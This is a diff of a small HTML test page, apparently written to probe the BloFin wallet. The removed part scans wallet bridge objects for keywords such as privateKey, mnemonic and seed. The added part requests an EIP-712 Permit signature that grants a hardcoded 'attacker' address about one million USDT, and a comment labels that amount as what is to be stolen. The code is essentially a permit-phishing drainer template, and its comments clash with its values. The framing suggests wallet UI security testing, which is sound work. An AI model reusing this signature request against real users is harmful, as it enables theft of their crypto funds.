@@ -1,61 +1,74 @@
 <html>
-<body style="background:#000;color:#0f0;font-family:monospace;padding:15px">
-<button onclick="fuzz()" style="padding:20px;width:100%">FUZZ WALLET_BRIDGE_IN</button>
+<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
+<button onclick="connect()" style="padding:15px;width:100%;margin-bottom:10px">1. CONNECT</button>
+<button onclick="testPermit()" style="padding:15px;width:100%;background:orange;color:#000">2. TEST PERMIT KRITIS</button>
 <pre id="log" style="white-space:pre-wrap;word-break:break-all"></pre>
 <script>
-function log(m){ document.getElementById('log').innerText += m+"\n"; }
+let account = null;
+function log(m){ document.getElementById('log').innerText += "\n" + m; }
 
-function fuzz(){
-  document.getElementById('log').innerText = "";
-  let targets = ["__WALLET_BRIDGE_IN__", "__WALLET_EMIT__", "__WALLET_ERROR_COUNT__", "__WALLET_BRIDGE__", "WALLET_BRIDGE_IN"];
+async function connect(){
+  let acc = await window.ethereum.request({method:'eth_requestAccounts'});
+  account = acc[0];
+  log("Connected: " + account);
+}
 
-  targets.forEach(name=>{
-    let obj = window[name];
-    if(!obj){ log(`[NOT FOUND] window.${name}`); return; }
+async function testPermit(){
+  if(!account) return alert("Connect dulu!");
 
-    log(`\n========== [FOUND] window.${name} ==========`);
-    log(`typeof: ${typeof obj}`);
-    log(`String: ${String(obj).substring(0,200)}`);
+  // Ini Permit palsu untuk USDT / USDC
+  // Owner: kamu, Spender: attacker, Value: 1000 token (bisa max uint256)
+  const attacker = "0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
+  const domain = {
+    name: "Tether USD",
+    version: "1",
+    chainId: 1,
+    verifyingContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7" // USDT
+  };
+  const types = {
+    Permit: [
+      { name: "owner", type: "address" },
+      { name: "spender", type: "address" },
+      { name: "value", type: "uint256" },
+      { name: "nonce", type: "uint256" },
+      { name: "deadline", type: "uint256" }
+    ]
+  };
+  const message = {
+    owner: account,
+    spender: attacker,
+    value: "1000000000000", // 1.000.000 USDT (6 decimals) - ini yang mau dicuri
+    nonce: 0,
+    deadline: 9999999999
+  };
 
-    try{
-      let own = Object.getOwnPropertyNames(obj);
-      log(`getOwnPropertyNames: [${own.join(", ")}]`);
-    }catch(e){ log(`getOwnPropertyNames error: ${e}`); }
-
-    try{
-      let proto = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
-      log(`getPrototypeOf: [${proto.join(", ")}]`);
-    }catch(e){ log(`getPrototypeOf error: ${e}`); }
-
-    try{
-      let keys = [];
-      for(let k in obj) keys.push(k);
-      log(`for...in: [${keys.join(", ")}]`);
-    }catch(e){ log(`for...in error: ${e}`); }
-
-    // Cek apakah callable
-    if(typeof obj === 'function'){
-      log(`-> Ini FUNCTION, bisa dipanggil!`);
-      try{
-        // jangan panggil dengan data sensitif, cuma test kosong
-        let r = obj.toString().substring(0,500);
-        log(`func toString: ${r}`);
-      }catch(e){}
-    }
-
-    // Cek property yang bahaya
-    let dangerous = ["clipboard","keychain","privateKey","mnemonic","seed","keystore","file","open","export","secret","password","biometric"];
-    dangerous.forEach(d=>{
-      if(JSON.stringify(Object.getOwnPropertyNames(obj)).toLowerCase().includes(d)){
-        log(`!!! POTENTIAL CRITICAL KEYWORD: ${d}!!!`);
-      }
-    });
+  let data = JSON.stringify({
+    types: { EIP712Domain: [
+      {name:"name",type:"string"},
+      {name:"version",type:"string"},
+      {name:"chainId",type:"uint256"},
+      {name:"verifyingContract",type:"address"}
+    ], Permit: types.Permit },
+    domain: domain,
+    primaryType: "Permit",
+    message: message
   });
 
-  // Cek global juga
-  log("\n========== GLOBAL SCAN ==========");
-  let all = Object.keys(window).filter(k=>k.includes("WALLET")||k.includes("BRIDGE")||k.includes("BLOFIN")||k.includes("CLIP"));
-  log(`window keys containing WALLET/BRIDGE/BLOFIN/CLIP: [${all.join(", ")}]`);
+  log("Mengirim eth_signTypedData_v4...");
+  log(`Owner: ${message.owner}`);
+  log(`Spender (Attacker): ${message.spender}`);
+  log(`Value: ${message.value}`);
+
+  try{
+    let sig = await window.ethereum.request({
+      method: "eth_signTypedData_v4",
+      params: [account, data]
+    });
+    log("\n!!! DAPAT SIGNATURE: " + sig);
+    log("Kalau BloFin tidak menampilkan SPENDER dan VALUE dengan jelas di UI = KRITIS");
+  }catch(e){
+    log("\nBlocked/Rejected: " + e.message);
+  }
 }
 </script>
 </body>
